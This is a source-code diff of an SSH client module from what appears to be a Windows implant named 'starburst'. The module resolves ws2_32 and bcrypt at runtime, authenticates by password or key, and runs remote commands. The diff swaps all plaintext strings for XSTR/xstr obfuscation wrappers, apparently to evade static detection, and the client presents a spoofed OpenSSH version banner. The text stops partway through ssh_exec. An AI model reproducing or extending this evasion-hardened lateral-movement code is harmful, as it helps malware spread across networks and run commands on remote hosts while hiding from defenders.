@@ -216,7 +216,7 @@ static bool sock_recv_all(SshClientState* st, SshSession* sess, uint8_t* buf, ui
             char emsg[128];
             uint32_t eoff = 0;
             if (ctx) { while (*ctx && eoff < 30) emsg[eoff++] = *ctx++; emsg[eoff++] = ':'; }
-            const char* p = "sel=";
+            const char* p = XSTR("sel=");
             while (*p && eoff < 40) emsg[eoff++] = *p++;
             char num[12]; int_to_str(num, sel, 10);
             uint32_t nlen = 0; while(num[nlen]) nlen++;
@@ -232,7 +232,7 @@ static bool sock_recv_all(SshClientState* st, SshSession* sess, uint8_t* buf, ui
             char emsg[128];
             uint32_t eoff = 0;
             if (ctx) { const char* c = ctx; while (*c && eoff < 30) emsg[eoff++] = *c++; emsg[eoff++] = ':'; }
-            const char* p = "r=";
+            const char* p = XSTR("r=");
             while (*p && eoff < 40) emsg[eoff++] = *p++;
             char num[12]; int_to_str(num, r, 10);
             uint32_t nlen = 0; while(num[nlen]) nlen++;
@@ -317,14 +317,14 @@ static bool ssh_recv_packet(instance& inst, SshSession* sess, uint8_t** out_payl
     uint8_t first_block[16];
     if (!sock_recv_all(st, sess, first_block, block_size, 60000, ctx)) {
         if (st->last_error[0] == 0)
-            ssh_set_error(st, "recv_packet: first block read failed");
+            ssh_set_error(st, XSTR("recv_packet: first block read failed"));
         return false;
     }
 
     uint8_t decrypted_first[16];
     if (sess->encrypted) {
         if (!aes_ctr_crypt(inst, sess->dec_key, sess->dec_iv, first_block, block_size, decrypted_first)) {
-            ssh_set_error(st, "recv_packet: AES decrypt first block failed");
+            ssh_set_error(st, XSTR("recv_packet: AES decrypt first block failed"));
             return false;
         }
     } else {
@@ -333,7 +333,7 @@ static bool ssh_recv_packet(instance& inst, SshSession* sess, uint8_t** out_payl
 
     uint32_t packet_length = get_u32(decrypted_first);
     if (packet_length > SSH_MAX_PACKET_SIZE || packet_length < 2) {
-        ssh_set_error(st, "recv_packet: invalid packet_length");
+        ssh_set_error(st, XSTR("recv_packet: invalid packet_length"));
         return false;
     }
 
@@ -385,7 +385,7 @@ static bool ssh_recv_packet(instance& inst, SshSession* sess, uint8_t** out_payl
         }
         if (!mac_ok) {
             inst.heap_free(full_pkt);
-            ssh_set_error(st, "recv_packet: MAC verification failed");
+            ssh_set_error(st, XSTR("recv_packet: MAC verification failed"));
             return false;
         }
     }
@@ -437,11 +437,11 @@ static uint32_t write_ssh_mpint(uint8_t* buf, const uint8_t* data, uint32_t len)
 __attribute__((section(".text$B")))
 static bool build_kexinit(instance& inst, uint8_t** out, uint32_t* out_len) {
     // KEX algorithms we support
-    const char kex_algs[]     = "ecdh-sha2-nistp256";
-    const char host_key_algs[] = "ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-256,ssh-rsa";
-    const char enc_algs[]     = "aes256-ctr,aes128-ctr";
-    const char mac_algs[]     = "hmac-sha2-256";
-    const char comp_algs[]    = "none";
+    xstr(kex_algs, "ecdh-sha2-nistp256");
+    xstr(host_key_algs, "ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-256,ssh-rsa");
+    xstr(enc_algs, "aes256-ctr,aes128-ctr");
+    xstr(mac_algs, "hmac-sha2-256");
+    xstr(comp_algs, "none");
     const char langs[]        = "";
 
     uint32_t buf_size = 2048;
@@ -514,30 +514,30 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
     BCRYPT_ALG_HANDLE h_ecdh = nullptr;
     wchar_t ecdh_alg[] = { 'E','C','D','H','_','P','2','5','6', 0 };
     if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(&h_ecdh, ecdh_alg, nullptr, 0) != 0) {
-        ssh_set_error(st, "kex: BCryptOpenAlgorithmProvider ECDH_P256 failed");
+        ssh_set_error(st, XSTR("kex: BCryptOpenAlgorithmProvider ECDH_P256 failed"));
         return false;
     }
 
     BCRYPT_KEY_HANDLE h_keypair = nullptr;
     if (st->pBCryptGenerateKeyPair(h_ecdh, &h_keypair, 256, 0) != 0) {
         inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_ecdh, 0);
-        ssh_set_error(st, "kex: BCryptGenerateKeyPair failed");
+        ssh_set_error(st, XSTR("kex: BCryptGenerateKeyPair failed"));
         return false;
     }
     if (st->pBCryptFinalizeKeyPair(h_keypair, 0) != 0) {
         st->pBCryptDestroyKey(h_keypair);
         inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_ecdh, 0);
-        ssh_set_error(st, "kex: BCryptFinalizeKeyPair failed");
+        ssh_set_error(st, XSTR("kex: BCryptFinalizeKeyPair failed"));
         return false;
     }
 
     // Export our public key (BCRYPT_ECCPUBLIC_BLOB format)
     ULONG pub_blob_len = 0;
-    st->pBCryptExportKey(h_keypair, nullptr, (LPCWSTR)L"ECCPUBLICBLOB", nullptr, 0, &pub_blob_len, 0);
+    st->pBCryptExportKey(h_keypair, nullptr, XWSTR(L"ECCPUBLICBLOB"), nullptr, 0, &pub_blob_len, 0);
     auto pub_blob = static_cast<uint8_t*>(inst.heap_alloc(pub_blob_len));
-    if (!pub_blob) { ssh_set_error(st, "kex: alloc pub_blob failed"); goto fail_kex; }
-    if (st->pBCryptExportKey(h_keypair, nullptr, (LPCWSTR)L"ECCPUBLICBLOB", pub_blob, pub_blob_len, &pub_blob_len, 0) != 0) {
-        ssh_set_error(st, "kex: BCryptExportKey failed"); goto fail_kex; }
+    if (!pub_blob) { ssh_set_error(st, XSTR("kex: alloc pub_blob failed")); goto fail_kex; }
+    if (st->pBCryptExportKey(h_keypair, nullptr, XWSTR(L"ECCPUBLICBLOB"), pub_blob, pub_blob_len, &pub_blob_len, 0) != 0) {
+        ssh_set_error(st, XSTR("kex: BCryptExportKey failed")); goto fail_kex; }
 
     {
         // BCRYPT_ECCKEY_BLOB: { magic(4), cbKey(4) } then X(cbKey), Y(cbKey)
@@ -557,7 +557,7 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
 
         if (!ssh_send_packet(inst, sess, init_pkt, init_len)) {
             inst.heap_free(init_pkt);
-            ssh_set_error(st, "kex: failed to send ECDH_INIT");
+            ssh_set_error(st, XSTR("kex: failed to send ECDH_INIT"));
             goto fail_kex;
         }
         inst.heap_free(init_pkt);
@@ -565,15 +565,15 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
         // Receive SSH_MSG_KEX_ECDH_REPLY
         uint8_t* reply = nullptr;
         uint32_t reply_len = 0;
-        if (!ssh_recv_packet(inst, sess, &reply, &reply_len, "ecdh_reply") || !reply) {
+        if (!ssh_recv_packet(inst, sess, &reply, &reply_len, XSTR("ecdh_reply")) || !reply) {
             if (st->last_error[0] == 0)
-                ssh_set_error(st, "kex: failed to recv ECDH_REPLY");
+                ssh_set_error(st, XSTR("kex: failed to recv ECDH_REPLY"));
             goto fail_kex;
         }
 
         if (reply[0] != SSH_MSG_KEX_ECDH_REPLY) {
             inst.heap_free(reply);
-            ssh_set_error(st, "kex: expected ECDH_REPLY, got wrong msg type");
+            ssh_set_error(st, XSTR("kex: expected ECDH_REPLY, got wrong msg type"));
             goto fail_kex;
         }
 
@@ -591,7 +591,7 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
 
         if (qs_len != 65 || Q_S[0] != 0x04) {
             inst.heap_free(reply);
-            ssh_set_error(st, "kex: server Q_S not uncompressed P256 point");
+            ssh_set_error(st, XSTR("kex: server Q_S not uncompressed P256 point"));
             goto fail_kex;
         }
 
@@ -608,11 +608,11 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
         memory::copy(import_blob + 8 + 32, Q_S + 33, 32); // Y
 
         BCRYPT_KEY_HANDLE h_server_key = nullptr;
-        if (st->pBCryptImportKeyPair(h_ecdh, nullptr, (LPCWSTR)L"ECCPUBLICBLOB",
+        if (st->pBCryptImportKeyPair(h_ecdh, nullptr, XWSTR(L"ECCPUBLICBLOB"),
             &h_server_key, import_blob, import_blob_len, 0) != 0) {
             inst.heap_free(import_blob);
             inst.heap_free(reply);
-            ssh_set_error(st, "kex: BCryptImportKeyPair server key failed");
+            ssh_set_error(st, XSTR("kex: BCryptImportKeyPair server key failed"));
             goto fail_kex;
         }
         inst.heap_free(import_blob);
@@ -622,7 +622,7 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
         if (st->pBCryptSecretAgreement(h_keypair, h_server_key, &h_secret, 0) != 0) {
             st->pBCryptDestroyKey(h_server_key);
             inst.heap_free(reply);
-            ssh_set_error(st, "kex: BCryptSecretAgreement failed");
+            ssh_set_error(st, XSTR("kex: BCryptSecretAgreement failed"));
             goto fail_kex;
         }
 
@@ -634,7 +634,7 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
             st->pBCryptDestroySecret(h_secret);
             st->pBCryptDestroyKey(h_server_key);
             inst.heap_free(reply);
-            ssh_set_error(st, "kex: BCryptDeriveKey (TRUNCATE) failed");
+            ssh_set_error(st, XSTR("kex: BCryptDeriveKey (TRUNCATE) failed"));
             goto fail_kex;
         }
         st->pBCryptDestroySecret(h_secret);
@@ -682,18 +682,18 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
         // Send SSH_MSG_NEWKEYS
         uint8_t newkeys[1] = { SSH_MSG_NEWKEYS };
         if (!ssh_send_packet(inst, sess, newkeys, 1)) {
-            ssh_set_error(st, "kex: failed to send NEWKEYS"); goto fail_kex; }
+            ssh_set_error(st, XSTR("kex: failed to send NEWKEYS")); goto fail_kex; }
 
         // Receive SSH_MSG_NEWKEYS
         uint8_t* nk_reply = nullptr;
         uint32_t nk_len = 0;
-        if (!ssh_recv_packet(inst, sess, &nk_reply, &nk_len, "newkeys") || !nk_reply) {
+        if (!ssh_recv_packet(inst, sess, &nk_reply, &nk_len, XSTR("newkeys")) || !nk_reply) {
             if (st->last_error[0] == 0)
-                ssh_set_error(st, "kex: failed to recv NEWKEYS");
+                ssh_set_error(st, XSTR("kex: failed to recv NEWKEYS"));
             goto fail_kex; }
         if (nk_reply[0] != SSH_MSG_NEWKEYS) {
             inst.heap_free(nk_reply);
-            ssh_set_error(st, "kex: expected NEWKEYS, got wrong msg"); goto fail_kex;
+            ssh_set_error(st, XSTR("kex: expected NEWKEYS, got wrong msg")); goto fail_kex;
         }
         inst.heap_free(nk_reply);
 
@@ -715,18 +715,18 @@ static bool do_kex_ecdh(instance& inst, SshSession* sess,
         wchar_t chain_ecb[] = { 'C','h','a','i','n','i','n','g','M','o','d','e','E','C','B', 0 };
 
         if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(&h_aes, aes_alg, nullptr, 0) != 0) {
-            ssh_set_error(st, "kex: BCryptOpenAlgorithmProvider AES failed"); goto fail_kex; }
-        inst.bcrypt_mod.BCryptSetProperty(h_aes, (LPCWSTR)L"ChainingMode",
+            ssh_set_error(st, XSTR("kex: BCryptOpenAlgorithmProvider AES failed")); goto fail_kex; }
+        inst.bcrypt_mod.BCryptSetProperty(h_aes, XWSTR(L"ChainingMode"),
             (PUCHAR)chain_ecb, sizeof(chain_ecb), 0);
 
         // check which key size the negotiation selected (we prefer aes256-ctr → 32-byte keys)
         if (inst.bcrypt_mod.BCryptGenerateSymmetricKey(h_aes, &sess->enc_key, nullptr, 0, key_cs, 32, 0) != 0) {
             inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_aes, 0);
-            ssh_set_error(st, "kex: BCryptGenerateSymmetricKey enc failed"); goto fail_kex;
+            ssh_set_error(st, XSTR("kex: BCryptGenerateSymmetricKey enc failed")); goto fail_kex;
         }
         if (inst.bcrypt_mod.BCryptGenerateSymmetricKey(h_aes, &sess->dec_key, nullptr, 0, key_sc, 32, 0) != 0) {
             inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_aes, 0);
-            ssh_set_error(st, "kex: BCryptGenerateSymmetricKey dec failed"); goto fail_kex;
+            ssh_set_error(st, XSTR("kex: BCryptGenerateSymmetricKey dec failed")); goto fail_kex;
         }
         sess->h_aes = h_aes;
 
@@ -898,7 +898,7 @@ static const uint8_t* ssh_read_string(const uint8_t* buf, uint32_t buf_len, uint
 __attribute__((section(".text$B")))
 static bool parse_openssh_key(const uint8_t* data, uint32_t data_len, RsaKeyComponents* out) {
     // "openssh-key-v1\0" magic (15 bytes)
-    const char magic[] = "openssh-key-v1";
+    xstr(magic, "openssh-key-v1");
     if (data_len < 15) return false;
     for (int i = 0; i < 15; i++) {
         if (data[i] != (uint8_t)magic[i]) return false;
@@ -1058,7 +1058,7 @@ static uint8_t* build_ssh_rsa_pubkey_blob(instance& inst, RsaKeyComponents* k, u
     uint32_t e_pad = (k->e_len > 0 && (k->e[0] & 0x80)) ? 1 : 0;
     uint32_t n_pad = (k->n_len > 0 && (k->n[0] & 0x80)) ? 1 : 0;
 
-    char key_type[] = "ssh-rsa";
+    xstr(key_type, "ssh-rsa");
     uint32_t kt_len = 7;
 
     uint32_t blob_len = 4 + kt_len + 4 + e_pad + k->e_len + 4 + n_pad + k->n_len;
@@ -1086,7 +1086,7 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
     auto st = get_state(inst);
 
     // Request ssh-userauth service
-    const char svc[] = "ssh-userauth";
+    xstr(svc, "ssh-userauth");
     uint32_t svc_len = 12;
     uint32_t sr_len = 1 + 4 + svc_len;
     auto sr = static_cast<uint8_t*>(inst.heap_alloc(sr_len));
@@ -1098,10 +1098,10 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
     inst.heap_free(sr);
 
     uint8_t* resp = nullptr; uint32_t resp_len = 0;
-    if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "svc_accept") || !resp) {
-        ssh_set_error(st, "pubkey auth: no SERVICE_ACCEPT"); return false;
+    if (!ssh_recv_packet(inst, sess, &resp, &resp_len, XSTR("svc_accept")) || !resp) {
+        ssh_set_error(st, XSTR("pubkey auth: no SERVICE_ACCEPT")); return false;
     }
-    if (resp[0] != SSH_MSG_SERVICE_ACCEPT) { inst.heap_free(resp); ssh_set_error(st, "pubkey auth: SERVICE_REQUEST rejected"); return false; }
+    if (resp[0] != SSH_MSG_SERVICE_ACCEPT) { inst.heap_free(resp); ssh_set_error(st, XSTR("pubkey auth: SERVICE_REQUEST rejected")); return false; }
     inst.heap_free(resp);
 
     // Parse PEM key
@@ -1109,7 +1109,7 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
     uint8_t* decoded_buf = nullptr;
     uint32_t decoded_len = 0;
     if (!parse_pem_rsa_key(inst, sess->key_data, sess->key_len, &kc, &decoded_buf, &decoded_len)) {
-        ssh_set_error(st, "pubkey auth: failed to parse PEM key");
+        ssh_set_error(st, XSTR("pubkey auth: failed to parse PEM key"));
         return false;
     }
 
@@ -1117,7 +1117,7 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
     BCRYPT_KEY_HANDLE h_rsa_key = import_rsa_key(inst, st, &kc);
     if (!h_rsa_key) {
         inst.heap_free(decoded_buf);
-        ssh_set_error(st, "pubkey auth: BCrypt RSA import failed");
+        ssh_set_error(st, XSTR("pubkey auth: BCrypt RSA import failed"));
         return false;
     }
 
@@ -1127,18 +1127,18 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
     if (!pub_blob) {
         st->pBCryptDestroyKey(h_rsa_key);
         inst.heap_free(decoded_buf);
-        ssh_set_error(st, "pubkey auth: failed to build pubkey blob");
+        ssh_set_error(st, XSTR("pubkey auth: failed to build pubkey blob"));
         return false;
     }
 
     // Build the data to sign (RFC 4252 + RFC 8332)
     // string(session_id) + byte(50) + string(username) + string("ssh-connection") +
     // string("publickey") + boolean(TRUE) + string("rsa-sha2-256") + string(pub_blob)
-    const char conn_svc[] = "ssh-connection";
+    xstr(conn_svc, "ssh-connection");
     uint32_t conn_svc_len = 14;
-    const char pk_method[] = "publickey";
+    xstr(pk_method, "publickey");
     uint32_t pk_method_len = 9;
-    const char sig_alg[] = "rsa-sha2-256";
+    xstr(sig_alg, "rsa-sha2-256");
     uint32_t sig_alg_len = 12;
     uint32_t user_len = str_len(sess->username);
 
@@ -1211,7 +1211,7 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
 
     if (sign_status != 0) {
         inst.heap_free(raw_sig); inst.heap_free(pub_blob);
-        ssh_set_error(st, "pubkey auth: BCryptSignHash failed");
+        ssh_set_error(st, XSTR("pubkey auth: BCryptSignHash failed"));
         return false;
     }
 
@@ -1259,7 +1259,7 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
 
     if (!ssh_send_packet(inst, sess, auth_pkt, auth_pkt_len)) {
         inst.heap_free(auth_pkt);
-        ssh_set_error(st, "pubkey auth: failed to send USERAUTH_REQUEST");
+        ssh_set_error(st, XSTR("pubkey auth: failed to send USERAUTH_REQUEST"));
         return false;
     }
     inst.heap_free(auth_pkt);
@@ -1267,7 +1267,7 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
     // Wait for USERAUTH_SUCCESS or FAILURE
     while (true) {
         uint8_t* aresp = nullptr; uint32_t alen = 0;
-        if (!ssh_recv_packet(inst, sess, &aresp, &alen, "userauth") || !aresp) return false;
+        if (!ssh_recv_packet(inst, sess, &aresp, &alen, XSTR("userauth")) || !aresp) return false;
 
         uint8_t msg_type = aresp[0];
         inst.heap_free(aresp);
@@ -1277,11 +1277,11 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
             return true;
         }
         if (msg_type == SSH_MSG_USERAUTH_FAILURE) {
-            ssh_set_error(st, "pubkey auth: USERAUTH_FAILURE (key rejected)");
+            ssh_set_error(st, XSTR("pubkey auth: USERAUTH_FAILURE (key rejected)"));
             return false;
         }
         if (msg_type == SSH_MSG_USERAUTH_BANNER) continue;
-        ssh_set_error(st, "pubkey auth: unexpected msg during auth");
+        ssh_set_error(st, XSTR("pubkey auth: unexpected msg during auth"));
         return false;
     }
 }
@@ -1291,7 +1291,7 @@ static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
 __attribute__((section(".text$B")))
 static bool ssh_auth_password(instance& inst, SshSession* sess) {
     // Request ssh-userauth service
-    const char svc[] = "ssh-userauth";
+    xstr(svc, "ssh-userauth");
     uint32_t svc_len = 12;
     uint32_t sr_len = 1 + 4 + svc_len;
     auto sr = static_cast<uint8_t*>(inst.heap_alloc(sr_len));
@@ -1304,14 +1304,14 @@ static bool ssh_auth_password(instance& inst, SshSession* sess) {
 
     // Receive SERVICE_ACCEPT
     uint8_t* resp = nullptr; uint32_t resp_len = 0;
-    if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "svc_accept") || !resp) { auto st2 = get_state(inst); if (st2->last_error[0] == 0) ssh_set_error(st2, "auth: no SERVICE_ACCEPT response"); return false; }
+    if (!ssh_recv_packet(inst, sess, &resp, &resp_len, XSTR("svc_accept")) || !resp) { auto st2 = get_state(inst); if (st2->last_error[0] == 0) ssh_set_error(st2, XSTR("auth: no SERVICE_ACCEPT response")); return false; }
     if (resp[0] != SSH_MSG_SERVICE_ACCEPT) { inst.heap_free(resp); ssh_set_error(get_state(inst), "auth: SERVICE_REQUEST rejected"); return false; }
     inst.heap_free(resp);
 
     // Send USERAUTH_REQUEST (password)
-    const char method[] = "password";
+    xstr(method, "password");
     uint32_t method_len = 8;
-    const char conn_svc[] = "ssh-connection";
+    xstr(conn_svc, "ssh-connection");
     uint32_t conn_svc_len = 14;
     uint32_t user_len = str_len(sess->username);
     uint32_t pass_len = str_len(sess->password);
@@ -1342,7 +1342,7 @@ static bool ssh_auth_password(instance& inst, SshSession* sess) {
     // May get USERAUTH_BANNER first, skip it
     while (true) {
         uint8_t* aresp = nullptr; uint32_t alen = 0;
-        if (!ssh_recv_packet(inst, sess, &aresp, &alen, "userauth") || !aresp) return false;
+        if (!ssh_recv_packet(inst, sess, &aresp, &alen, XSTR("userauth")) || !aresp) return false;
 
         uint8_t msg_type = aresp[0];
         inst.heap_free(aresp);
@@ -1362,7 +1362,7 @@ static bool ssh_auth_password(instance& inst, SshSession* sess) {
 
 __attribute__((section(".text$B")))
 static bool ssh_channel_open(instance& inst, SshSession* sess) {
-    const char session_str[] = "session";
+    xstr(session_str, "session");
     uint32_t session_str_len = 7;
 
     sess->local_channel = 0;
@@ -1393,7 +1393,7 @@ static bool ssh_channel_open(instance& inst, SshSession* sess) {
     // Wait for CHANNEL_OPEN_CONFIRMATION (skip GLOBAL_REQUEST messages from server)
     for (int attempt = 0; attempt < 10; attempt++) {
         uint8_t* resp = nullptr; uint32_t resp_len = 0;
-        if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "chan_open") || !resp) return false;
+        if (!ssh_recv_packet(inst, sess, &resp, &resp_len, XSTR("chan_open")) || !resp) return false;
 
         if (resp[0] == SSH_MSG_CHANNEL_OPEN_CONFIRM && resp_len >= 17) {
             sess->remote_channel = get_u32(resp + 5);
@@ -1429,7 +1429,7 @@ static bool ssh_channel_open(instance& inst, SshSession* sess) {
 
 __attribute__((section(".text$B")))
 static bool ssh_channel_exec(instance& inst, SshSession* sess, const char* command) {
-    const char exec_str[] = "exec";
+    xstr(exec_str, "exec");
     uint32_t exec_str_len = 4;
     uint32_t cmd_len = str_len(command);
 
@@ -1465,7 +1465,7 @@ static bool ssh_channel_read_all(instance& inst, SshSession* sess,
 
     while (!sess->channel_eof && !sess->channel_closed) {
         uint8_t* pkt = nullptr; uint32_t pkt_len = 0;
-        if (!ssh_recv_packet(inst, sess, &pkt, &pkt_len, "chan_data")) break;
+        if (!ssh_recv_packet(inst, sess, &pkt, &pkt_len, XSTR("chan_data"))) break;
         if (!pkt) break;
 
         uint8_t msg = pkt[0];
@@ -1536,7 +1536,7 @@ static bool ssh_channel_read_all(instance& inst, SshSession* sess,
             // check for exit-status
             if (pkt_len > 13) {
                 uint32_t req_type_len = get_u32(pkt + 5);
-                const char exit_status_str[] = "exit-status";
+                xstr(exit_status_str, "exit-status");
                 if (req_type_len == 11 && pkt_len >= 9 + 11 + 1 + 4) {
                     bool match = true;
                     for (int i = 0; i < 11; i++) {
@@ -1582,7 +1582,7 @@ auto declfn starburst::ssh_client_init(instance& inst) -> bool {
     memory::zero(state, sizeof(SshClientState));
 
     // Load ws2_32.dll
-    char ws2_name[] = { 'w','s','2','_','3','2','.','d','l','l', 0 };
+    xstr(ws2_name, "ws2_32.dll");
     state->h_ws2 = (HMODULE)inst.kernel32.LoadLibraryA(ws2_name);
     if (!state->h_ws2) { inst.heap_free(state); return false; }
 
@@ -1607,7 +1607,7 @@ auto declfn starburst::ssh_client_init(instance& inst) -> bool {
     #undef RESOLVE_WS
 
     // Resolve BCrypt ECDH APIs from bcrypt module handle
-    char bcrypt_name[] = { 'b','c','r','y','p','t','.','d','l','l', 0 };
+    xstr(bcrypt_name, "bcrypt.dll");
     state->h_bcrypt = (HMODULE)inst.kernel32.LoadLibraryA(bcrypt_name);
     if (!state->h_bcrypt) { inst.heap_free(state); return false; }
 
@@ -1680,7 +1680,7 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
     if (!st || !st->initialized) {
         if (!starburst::ssh_client_init(inst)) {
             st = get_state(inst);
-            if (st) ssh_set_error(st, "ssh_client_init failed");
+            if (st) ssh_set_error(st, XSTR("ssh_client_init failed"));
             return -1;
         }
         st = get_state(inst);
@@ -1693,7 +1693,7 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
     for (int i = 0; i < SSH_MAX_SESSIONS; i++) {
         if (!st->sessions[i].active) { idx = i; break; }
     }
-    if (idx < 0) { ssh_set_error(st, "no free session slot"); return -1; }
+    if (idx < 0) { ssh_set_error(st, XSTR("no free session slot")); return -1; }
 
     SshSession* sess = &st->sessions[idx];
     memory::zero(sess, sizeof(SshSession));
@@ -1702,7 +1702,7 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
     uint32_t hl = str_len(host);
     uint32_t ul = str_len(username);
     uint32_t pl = str_len(password);
-    if (hl >= 256 || ul >= 128 || pl >= 256) { ssh_set_error(st, "host/user/pass too long"); return -1; }
+    if (hl >= 256 || ul >= 128 || pl >= 256) { ssh_set_error(st, XSTR("host/user/pass too long")); return -1; }
     memory::copy(sess->host, (void*)host, hl);
     memory::copy(sess->username, (void*)username, ul);
     memory::copy(sess->password, (void*)password, pl);
@@ -1719,7 +1719,7 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
 
     // Declare all variables before gotos
     char port_str[8] = {};
-    char client_version[] = "SSH-2.0-OpenSSH_9.5";
+    xstr(client_version, "SSH-2.0-OpenSSH_9.5");
     uint32_t cv_len = 19;
     char version_line[64] = {};
     char server_version[256] = {};
@@ -1738,21 +1738,21 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
 
         ws_addrinfo_ssh* result = nullptr;
         if (st->pgetaddrinfo(host, port_str, (const void*)&hints, (void**)&result) != 0) {
-            ssh_set_error(st, "getaddrinfo failed (DNS/host resolve)");
+            ssh_set_error(st, XSTR("getaddrinfo failed (DNS/host resolve)"));
             return -1;
         }
 
         sess->sock = st->psocket(WS_AF_INET, WS_SOCK_STREAM, WS_IPPROTO_TCP);
         if (sess->sock == WS_INVALID_SOCKET) {
             st->pfreeaddrinfo(result);
-            ssh_set_error(st, "socket() failed");
+            ssh_set_error(st, XSTR("socket() failed"));
             return -1;
         }
 
         if (st->pconnect(sess->sock, result->ai_addr, (int)result->ai_addrlen) != 0) {
             st->pclosesocket(sess->sock);
             st->pfreeaddrinfo(result);
-            ssh_set_error(st, "TCP connect failed (host unreachable or port closed)");
+            ssh_set_error(st, XSTR("TCP connect failed (host unreachable or port closed)"));
             return -1;
         }
         st->pfreeaddrinfo(result);
@@ -1764,7 +1764,7 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
     version_line[cv_len + 1] = '\n';
 
     if (!sock_send_all(st, sess, (uint8_t*)version_line, cv_len + 2)) {
-        ssh_set_error(st, "failed to send SSH version string");
+        ssh_set_error(st, XSTR("failed to send SSH version string"));
         goto fail_connect;
     }
 
@@ -1774,7 +1774,7 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
         while (sv_off < 255) {
             uint8_t ch;
             if (!sock_recv_all(st, sess, &ch, 1, 10000)) {
-                ssh_set_error(st, "timeout reading server version");
+                ssh_set_error(st, XSTR("timeout reading server version"));
                 goto fail_connect;
             }
             if (ch == '\n') break;
@@ -1785,13 +1785,13 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
 
     // Send our KEXINIT
     if (!build_kexinit(inst, &client_kexinit, &cki_len)) {
-        ssh_set_error(st, "build_kexinit failed");
+        ssh_set_error(st, XSTR("build_kexinit failed"));
         goto fail_connect;
     }
 
     if (!ssh_send_packet(inst, sess, client_kexinit, cki_len)) {
         inst.heap_free(client_kexinit);
-        ssh_set_error(st, "failed to send KEXINIT");
+        ssh_set_error(st, XSTR("failed to send KEXINIT"));
         goto fail_connect;
     }
 
@@ -1799,17 +1799,17 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
     {
         uint8_t* server_kexinit = nullptr;
         uint32_t ski_len = 0;
-        if (!ssh_recv_packet(inst, sess, &server_kexinit, &ski_len, "kexinit") || !server_kexinit) {
+        if (!ssh_recv_packet(inst, sess, &server_kexinit, &ski_len, XSTR("kexinit")) || !server_kexinit) {
             inst.heap_free(client_kexinit);
             if (st->last_error[0] == 0)
-                ssh_set_error(st, "failed to recv server KEXINIT");
+                ssh_set_error(st, XSTR("failed to recv server KEXINIT"));
             goto fail_connect;
         }
 
         if (server_kexinit[0] != SSH_MSG_KEXINIT) {
             inst.heap_free(client_kexinit);
             inst.heap_free(server_kexinit);
-            ssh_set_error(st, "server first packet not KEXINIT");
+            ssh_set_error(st, XSTR("server first packet not KEXINIT"));
             goto fail_connect;
         }
 
@@ -1825,7 +1825,7 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
 
         if (!kex_ok) {
             if (st->last_error[0] == 0)
-                ssh_set_error(st, "ECDH key exchange failed");
+                ssh_set_error(st, XSTR("ECDH key exchange failed"));
             goto fail_connect;
         }
     }
@@ -1834,13 +1834,13 @@ auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t po
     if (sess->key_data && sess->key_len > 0) {
         if (!ssh_auth_publickey(inst, sess)) {
             if (st->last_error[0] == 0)
-                ssh_set_error(st, "publickey authentication failed");
+                ssh_set_error(st, XSTR("publickey authentication failed"));
             goto fail_connect;
         }
     } else {
         if (!ssh_auth_password(inst, sess)) {
             if (st->last_error[0] == 0)
-                ssh_set_error(st, "password authentication failed");
+                ssh_set_error(st, XSTR("password authentication failed"));
             goto fail_connect;
         }
     }
@@ -1858,17 +1858,17 @@ auto declfn starburst::ssh_exec(instance& inst, uint32_t session_idx, const char
     char** output, uint32_t* output_len) -> bool
 {
     auto st = get_state(inst);
-    if (!st || session_idx >= SSH_MAX_SESSIONS) { if (st) ssh_set_error(st, "invalid session index"); return false; }
+    if (!st || session_idx >= SSH_MAX_SESSIONS) { if (st) ssh_set_error(st, XSTR("invalid session index")); return false; }
 
     SshSession* sess = &st->sessions[session_idx];
-    if (!sess->active || !sess->authenticated) { ssh_set_error(st, "session not active or not authenticated"); return false; }
+    if (!sess->active || !sess->authenticated) { ssh_set_error(st, XSTR("session not active or not authenticated")); return false; }
 
     *output = nullptr;
     *output_len = 0;
 
     // Open channel, exec, read output, close
-    if (!ssh_channel_open(inst, sess)) { ssh_set_error(st, "channel_open failed"); return false; }
-    if (!ssh_channel_exec(inst, sess, command)) { ssh_set_error(st, "channel_exec failed"); return false; }
+    if (!ssh_channel_open(inst, sess)) { ssh_set_error(st, XSTR("channel_open failed")); return false; }
+    if (!ssh_channel_exec(inst, sess, command)) { ssh_set_error(st, XSTR("channel_exec failed")); return false; }
 
